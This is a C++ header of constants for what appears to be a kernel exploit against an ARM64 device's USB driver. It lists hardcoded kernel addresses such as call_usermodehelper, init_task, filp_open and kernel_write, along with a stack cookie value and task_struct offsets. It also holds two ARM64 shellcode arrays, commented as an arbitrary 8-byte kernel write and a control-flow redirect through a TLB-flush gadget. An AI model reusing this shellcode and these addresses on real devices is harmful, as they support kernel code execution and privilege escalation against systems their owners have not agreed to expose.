#pragma once

#include <cstdint>
#include <vector>

namespace constants {

    inline uint64_t p64(uint64_t val) { return val; } // Assumes little-endian host
    inline uint64_t u64(const uint8_t* data) { return *reinterpret_cast<const uint64_t*>(data); }

    constexpr uint64_t STACK_COOKIE = 0xCB88537FDC8BA68B;

    constexpr uint64_t SWAPPER_PG_DIR = 0xFFFFFFC00066c000;
    constexpr uint64_t INIT_TASK = 0xFFFFFFC00059f380;
    constexpr uint64_t CALL_UMH = 0xFFFFFFC0000a0f40;
    constexpr uint64_t QUEUE_WORK_ON = 0xFFFFFFC0000A2C1C;
    constexpr uint64_t SYSTEM_WQ = 0xFFFFFFC00059E870;
    constexpr uint64_t __VMALLOC_ADDR = 0xFFFFFFC000114D5C;

    constexpr uint64_t FILP_OPEN = 0xFFFFFFC000120420;
    constexpr uint64_t KERNEL_WRITE = 0xFFFFFFC000146D4C;
    constexpr uint64_t FILP_CLOSE = 0xFFFFFFC00011EFFC;

    constexpr uint64_t CLEAN_RETURN = 0xFFFFFFC000305778;

    constexpr uint64_t SAUTH_SIEUSB = 0xFFFFFFBFFC0Af188;
    constexpr uint64_t REPORT_0xFF = 0xFFFFFFBFFC0CFFE8;

    constexpr uint64_t INJECT_BASE = 0xFFFFFFC00036EDF0;
    constexpr uint64_t TEXT_STR_SC = INJECT_BASE;
    constexpr uint64_t TEXT_ALLOC_BASE = INJECT_BASE + 0x10;
    constexpr uint64_t TEXT_DATA = INJECT_BASE + 0x20;

    constexpr uint64_t BSS_DATA = 0xFFFFFFC000670B00;

    const std::vector<uint8_t> STR_SHELLCODE = {
        0x93, 0x02, 0x00, 0xF9,  // STR X19, [X20]         ; our 8-byte write
        0xF4, 0x03, 0x15, 0xAA,  // MOV X20, X21           ; redirect for mtu3_req_complete STRB
        0x60, 0x5A, 0xFE, 0x17,  // B CLEAN_RETURN
    };

    constexpr uint64_t TLBI_GADGET_ADDR = 0xFFFFFFC000112BF4;
    constexpr uint64_t RAW_SPIN_LOCK_ADDR = 0xFFFFFFC00036D5B8;
    constexpr uint64_t ISR_EPILOGUE_ADDR = 0xFFFFFFC000303C64;

    const std::vector<uint8_t> TLB_SHELLCODE = {
        0xE0, 0x03, 0x15, 0xAA,  // 0x00: MOV X0, X21
        0xA1, 0x00, 0x00, 0x58,  // 0x04: LDR X1, pc+20
        0x20, 0x00, 0x3F, 0xD6,  // 0x08: BLR X1
        0x9F, 0x36, 0x03, 0x39,  // 0x0C: STRB WZR, [X20, #0xCD]
        0x80, 0x00, 0x00, 0x58,  // 0x10: LDR X0, pc+16
        0x00, 0x00, 0x1F, 0xD6   // 0x14: BR X0
        // Literal pool follows...
    };

    constexpr uint64_t OFF_TASK_TASKS = 0x3A8;
    constexpr uint64_t OFF_TASK_COMM = 0x658;
    constexpr uint64_t OFF_TASK_FS = 0x690;
    constexpr uint64_t OFF_TASK_NSPROXY = 0x6A0;
    constexpr uint64_t OFF_TASK_MM = 0x3F8;

    constexpr uint64_t PAGE_OFFSET_BASE = 0xFFFFFFC000000000;
    constexpr uint64_t PHYS_OFFSET = 0x40000000;

    constexpr uint64_t SAUTH_OFFSET = 0x800;
    constexpr uint64_t DESC_PTR_OFFSET = 0x20;
    constexpr uint64_t CONFIG_PTR_OFFSET = 0x30;
    constexpr uint64_t GET_ALT_OFFSET = 0x70;
    constexpr uint64_t AUTH1_DATA_OFFSET = 0xF0;
}